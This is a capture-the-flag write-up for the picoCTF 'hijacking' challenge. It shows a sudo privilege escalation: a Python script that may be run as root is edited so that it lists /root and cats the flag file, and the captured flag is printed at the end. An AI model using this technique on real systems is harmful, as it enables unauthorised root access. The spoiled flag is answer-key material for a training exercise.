# hijacking

## Challenge

### Description

Getting root access can allow you to read the flag. Luckily there is a python file that you might like to play with.

Through Social engineering, we've got the credentials to use on the server. SSH is running on the server.

`saturn.picoctf.net 56938`

Username: `picoctf`

### Hints

1. Check for Hidden files
2. No place like Home:)

## Solution

After connecting to the server, we run `sudo -l` and notice that we are allowed to run `vi` and `.server.py` as root privilege with no password.

```console
$ sudo -l
Matching Defaults entries for picoctf on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoctf may run the following commands on challenge:
    (ALL) /usr/bin/vi
    (root) NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py
```

So all we need to do is using `sudo vi .server.py` to modify `.server.py` into

```python
import os

# List files in /root
print(os.listdir("/root"))

# Print flag
os.system("cat /root/.flag.txt")
```

And then run `.server.py` with root privilege `sudo python3 ~/.server.py`

## Flag

picoCTF{pYth0nn_libraryH!j@CK!n9_0083cb0b}
